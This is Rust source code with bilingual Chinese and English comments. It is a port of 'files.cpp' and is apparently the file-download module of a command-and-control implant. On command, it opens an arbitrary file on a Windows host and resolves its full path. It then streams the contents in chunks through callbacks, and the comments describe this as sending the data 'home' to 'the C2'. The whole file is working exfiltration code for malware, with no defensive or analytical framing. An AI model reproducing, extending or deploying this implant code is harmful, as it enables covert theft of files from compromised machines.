//! files.cpp 的移植——下载跟踪。
//! Port of files.cpp — download tracking.

use crate::bformat::bformat_init;
use crate::callback::{post_error_s, Callback};
use crate::commands::{CALLBACK_FILE, CALLBACK_FILE_CLOSE, CALLBACK_FILE_WRITE, MAX_PACKET};
use crate::parse::DataP;
use parking_lot::Mutex;
use std::io::Read;
use std::sync::atomic::{AtomicU32, Ordering};
use windows_sys::Win32::Storage::FileSystem::GetFullPathNameA;

/// 下载列表中的一个条目（file_entry）。
/// An entry in the download list (file_entry).
struct FileEntry {
    id: u32,
    toread: u32,
    handle: Option<std::fs::File>,
}

/// 跟踪我们打开的下载（download_list）。download_poll() 会清理该列表；
/// 退出时未完成的下载不会得到清理（与 C++ 相同）。
/// Track our open downloads (download_list). download_poll() cleans this
/// list up; on exit pending downloads would not be cleaned up (same as C++).
static DOWNLOAD_LIST: Mutex<Vec<FileEntry>> = Mutex::new(Vec::new());

/// 跟踪下载标识符（download_id）。
/// Track download identifiers (download_id).
static DOWNLOAD_ID: AtomicU32 = AtomicU32::new(0);

/// 用于读取文件数据的共享缓冲区（read_buffer）。
/// Shared buffer used for reading file data (read_buffer).
static READ_BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// 下载一些内容。
/// Download some content.
pub fn command_download(buffer: &[u8], length: usize, cb: Callback) {
    // 分配我们所需的内存
    // allocate the memory we need
    let mut chunk = vec![0u8; 4096];
    let (fname, fullname) = chunk.split_at_mut(2048);

    // 确定文件名（data_string_oneoff：整个载荷就是该字符串，拷贝并以 NUL 结尾）
    // determine the file name (data_string_oneoff: the whole payload is the
    // string, copied and NUL terminated)
    let mut data = buffer[..length].to_vec();
    let parser = DataP::init(&mut data);
    let fname_len = parser.data_length();
    if (fname_len + 1) < 2048 {
        fname[..fname_len].copy_from_slice(&parser.data_buffer()[..fname_len]);
        fname[fname_len] = 0;
    }

    // 以读取方式打开文件
    // open the file for reading
    let fname_str = std::ffi::CStr::from_bytes_until_nul(fname)
        .map(|c| c.to_bytes())
        .unwrap_or(b"");
    let infile = match std::fs::File::open(std::path::Path::new(std::str::from_utf8(fname_str).unwrap_or(""))) {
        Ok(f) => f,
        Err(_) => {
            post_error_s(0x28, fname_str);
            return;
        }
    };

    // 计算文件大小（存于 fsz）
    // compute the file size (stored in fsz)
    let fsz = infile.metadata().map(|m| m.len() as i64).unwrap_or(-1);

    // 若这一步失败，向用户报告错误
    // if this part failed, report an error to the user
    if fsz <= 0 || fsz > 0xffff_ffff {
        post_error_s(0x3c, fname_str);
        return;
    }

    // 获取文件的完整路径
    // get the file's full path
    let nsz = unsafe {
        GetFullPathNameA(
            fname.as_ptr(),
            2048,
            fullname.as_mut_ptr(),
            std::ptr::null_mut(),
        )
    };
    if nsz == 0 || nsz > 2048 {
        post_error_s(0x3d, fname_str);
        return;
    }

    // 创建一个新的下载条目（现在正是时候）。条目在 download_poll() 中
    // 处理完毕或被停止后释放。
    // create a new download entry (now is a good time). The entry is freed in
    // download_poll() once fully processed or stopped.
    let id = DOWNLOAD_ID.fetch_add(1, Ordering::SeqCst);
    let mut list = DOWNLOAD_LIST.lock();
    list.push(FileEntry {
        id,
        toread: fsz as u32,
        handle: Some(infile),
    });

    // CALLBACK_FILE
    //   int4             = 下载标识符 / download identifier
    //   int4             = 文件大小 / file size
    //   char[..length..] = 文件名（完整路径）/ file name (full path)
    let mut builder = bformat_init(4096);
    builder.bformat_int(id as i32);
    builder.bformat_int(fsz as i32);
    builder.bformat_copy(&fullname[..nsz as usize]);

    // 发送数据……
    // send the data...
    let built = builder.bformat_string();
    cb(built, builder.bformat_length() as i32, CALLBACK_FILE);

    // 清理资源
    // clean up resources
    builder.free();

    // 检查是否已经完成（fsz == 0；由于上面 fsz <= 0 会报错退出，这里实际不可达）
    // check if we're already done (fsz == 0; unreachable since fsz <= 0
    // errors out above)
    if fsz == 0 {
        if let Some(entry) = list.iter_mut().find(|e| e.id == id) {
            process_close(entry, cb);
        }
    }
}

/// 处理一次下载：读取一些数据并发回。
/// Process a download: read some data and send it home.
fn process_download(entry: &mut FileEntry, cb: Callback, max: usize) {
    // 确保我们有一个读取缓冲区……下载需要它
    // make sure we have a read buffer... our downloads need it
    let mut rb = READ_BUFFER.lock();
    if rb.is_empty() {
        rb.resize(MAX_PACKET + 4, 0);
    }

    // 把下载 id 拷贝进读取缓冲区
    // copy the download id into the read buffer
    let temp = entry.id.to_be_bytes(); // 相当于 C 的 htonl / htonl
    rb[..4].copy_from_slice(&temp);

    // 我们想读多少数据？
    // how much data do we want to read?
    let mut len: usize = 0;
    let mut readme: usize = if entry.toread as usize > max {
        max
    } else {
        entry.toread as usize
    };
    // 绝不超过共享缓冲区读取（防御性；调用方传入的 <= MAX_PACKET）
    // never read past our shared buffer (defensive; callers pass <= MAX_PACKET)
    readme = readme.min(rb.len() - 4);

    // 如果还有大量数据要读，就尽可能多读
    // if there's a lot of data to read, read as much as we can
    while readme > 0 {
        // 检查下载过程中是否出错……这点很重要，因为如果不捕获错误，
        // 我们会永远循环下去。C2 需要响应 CALLBACK_FILE_CLOSE，
        // 通过比对收到的数据 < size 来推断是否发生了错误
        // check for an error during the download... this is important because
        // if we don't catch this, we'll loop forever. The C2 needs to react to
        // CALLBACK_FILE_CLOSE to check that received data < size and infer an
        // error occurred
        let read = match entry.handle.as_mut() {
            Some(f) => f.read(&mut rb[4 + len..4 + len + readme]).unwrap_or(0),
            None => 0,
        };
        if read == 0 {
            entry.toread = 0;
            break;
        }
        len += read;
        readme -= read;
        entry.toread -= read as u32;
    }

    // 把所有数据发回
    // send all the data home
    cb(&rb[..len + 4], (len + 4) as i32, CALLBACK_FILE_WRITE);

    // 如需则关闭文件
    // close the file if needed
    process_close(entry, cb);
}

/// 处理已完成下载的关闭（process_close）。
/// Handle the close of a finished download (process_close).
fn process_close(entry: &mut FileEntry, cb: Callback) {
    // 如需则关闭文件
    // close the file if needed
    if entry.toread <= 0 {
        let temp = entry.id.to_be_bytes(); // 相当于 C 的 htonl / htonl
        cb(&temp, 4, CALLBACK_FILE_CLOSE);
        entry.handle.take(); // 相当于 C 的 fclose / fclose
    }
}

/// 按文件 id 停止一次下载。
/// Stop a download by its file id.
pub fn command_download_stop(buffer: &[u8], length: usize) {
    // 把 4 个字节拷贝到我们的文件 id
    // copy the 4 bytes to our file id
    let mut fid_bytes = [0u8; 4];
    let n = length.min(4);
    fid_bytes[..n].copy_from_slice(&buffer[..n]);
    let fid = u32::from_be_bytes(fid_bytes); // 相当于 C 的 ntohl / ntohl

    let mut list = DOWNLOAD_LIST.lock();
    for entry in list.iter_mut() {
        if entry.id == fid {
            // 让我们不再处理这个文件下载
            // make us no longer process this file download
            entry.toread = 0;

            // 关闭句柄
            // close the handle
            entry.handle.take(); // 相当于 C 的 fclose / fclose
        }
    }
}

/// 轮询打开的文件。读取一些数据并发送给客户端。
/// Poll the open files. Read some data and send it to the client.
pub fn download_poll(cb: Callback, max: usize) {
    let mut list = DOWNLOAD_LIST.lock();

    // 处理这些下载
    // process the downloads
    for entry in list.iter_mut() {
        if entry.toread > 0 {
            process_download(entry, cb, max);
        }
    }

    // 清理我们的列表（没有剩余数据可读的条目会被释放）
    // clean up our list (entries with nothing left to read are freed)
    list.retain(|e| e.toread > 0);
}
